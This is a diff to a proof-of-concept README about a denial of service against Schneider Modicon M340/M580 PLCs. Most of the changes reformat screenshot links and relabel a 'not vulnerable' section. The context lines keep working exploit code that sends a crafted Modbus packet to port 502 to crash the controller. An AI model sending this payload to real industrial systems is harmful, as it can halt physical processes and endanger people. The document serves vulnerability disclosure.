@@ -25,7 +25,9 @@ PLC Modicon line ("m340" & "m580") suffer a denial of services upon receiving a 
 	client.connect(("192.168.0.101",502)) 
 	client.send( "\x44\x62\x00\x00\x00\x06\x00\x5a\x00\x20\x00\x00") 
 	client.close()
-'''
+
+´´´
+
 
 ***
 
@@ -61,20 +63,31 @@ PLC Modicon line ("m340" & "m580") suffer a denial of services upon receiving a 
 ## POCs:
 
 [+] Poc device VULN:
+
 	[*] CHECK
-	![m340](screenshot/1_check.png) 	
+
+![m340](screenshot/1_check.png) 	
 	
+
 	[*] KILL
-	![m340](screenshot/2_kill.png) 	
-	
+
+![m340_kill](screenshot/2_kill.png)
+
+
 	[*] RE-CHECK
-	![m340](screenshot/2_reCheck.png) 	
+
+![m340_rc](screenshot/3_reCheck.png) 	
 
 
 
-[+] Poc device VULN:
+[+] Poc device NO VULN:
+
 	[*] CHECK
-	![m340](screenshot/1_check_a.png) 	
+
+![m340_ck](screenshot/noVuln/1_check_a.png) 	
 	
+
 	[*] KILL
-	![m340](screenshot/2_kill_a.png) 	
+
+![m340_kill](screenshot/noVuln/2_kill_a.png) 	
+
